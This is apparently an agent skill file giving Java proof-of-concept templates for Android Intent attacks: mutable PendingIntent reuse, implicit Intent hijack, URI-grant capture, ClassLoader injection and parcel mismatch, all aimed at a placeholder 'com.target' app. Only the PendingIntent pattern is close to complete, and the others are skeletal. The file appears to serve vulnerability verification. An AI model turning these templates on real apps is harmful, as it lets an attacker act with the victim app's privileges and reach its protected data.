---
name: poc-app-intent
description: Intent PoC reference covering mutable PendingIntent abuse, URI-grant abuse, implicit Intent hijack, ClassLoader injection, and parcel mismatch.
---

# Intent PoC Reference

Handle reuse, grant forwarding, or serialization-driven Intent attacks. Usually `returned-handle` or `interception` shapes.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---|---|---|---|
| mutable `PendingIntent` abuse | `returned-handle` | capture step if needed | victim-identity action runs |
| URI-grant abuse | `interception` or `returned-handle` | helper activity/receiver | protected `content://` URI becomes readable/writable |
| implicit Intent hijack | `interception` | helper component in Manifest | payload or workflow is intercepted |
| ClassLoader injection | advanced `direct-trigger` | custom payload class | unsafe deserialization path accepts crafted object |
| parcel mismatch | advanced `direct-trigger` | custom parcel builder | validation path and execution path diverge |

## Shared Inputs

Returned handle, grant-bearing URI, or trigger Intent source; exact target component/action/data URI/payload extra key; whether capture is needed first; visible success signal.

## Pattern 1 - Returned Handle Reuse

For mutable `PendingIntent` reuse.

```java
private static void runPendingIntentReuse(Context context) {
    PendingIntent pendingIntent = obtainTargetPendingIntent();
    if (pendingIntent == null) { Log.i("PoC", "Could not obtain target PendingIntent"); return; }

    Intent fillIntent = new Intent();
    fillIntent.setClassName("com.target", "com.target.PrivilegedActivity");
    fillIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

    try {
        pendingIntent.send(context, 0, fillIntent);
        Log.i("PoC", "Reused mutable PendingIntent with attacker-filled target");
    } catch (Exception e) {
        Log.e("PoC", "PendingIntent send failed", e);
    }
}
```

```java
static {
    register("intent-pending", "Reuse PendingIntent", () -> runPendingIntentReuse(appContext));
}
```

Acquisition sources: notification action, app widget template, IPC return value, provider result or activity extra. Do not invent a capture step the verified finding never proved.

## Pattern 2 - Grant Or Implicit-Intent Interception

For implicit Intent hijack or grant capture.

```java
private static void runImplicitIntentHijack(Context context) {
    Intent trigger = new Intent("com.target.TRIGGER_ACTION");
    context.sendBroadcast(trigger);
    Log.i("PoC", "Triggered flow that should emit an implicit Intent");
}
```

```java
static {
    register("intent-intercept", "Trigger Intent Interception", () -> runImplicitIntentHijack(appContext));
}
```

Manifest support: add a helper activity, receiver, or service with the matching `intent-filter` for the exact action/data scheme/category required.

## Pattern 3 - Advanced Serialization Path

For ClassLoader-dependent deserialization.

```java
private static void runClassLoaderInjection(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.DeserializeActivity");
    Log.i("PoC", "Prepare a payload class only after confirming the exact deserialization path.");
    context.startActivity(intent);
}
```

```java
static {
    register("intent-classloader", "Trigger ClassLoader Path", () -> runClassLoaderInjection(appContext));
}
```

Do not mark `build-ready` if the payload class still depends on unstated assumptions.

## Pattern 4 - Advanced Parcel Mismatch

For bundle or parcel shape mismatches.

```java
private static void runParcelMismatch(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.IntentProcessingActivity");
    Bundle bundle = new Bundle();
    intent.putExtra("extra_bundle", bundle);
    context.startActivity(intent);
    Log.i("PoC", "Replace the placeholder Bundle with a real crafted parcel after verifying the mismatch shape.");
}
```

```java
static {
    register("intent-parcel", "Trigger Parcel Mismatch", () -> runParcelMismatch(appContext));
}
```

Treat parcel mismatch as high-cost and exact-shape dependent. Do not overclaim compile or runtime readiness if the crafted parcel is not actually implemented.
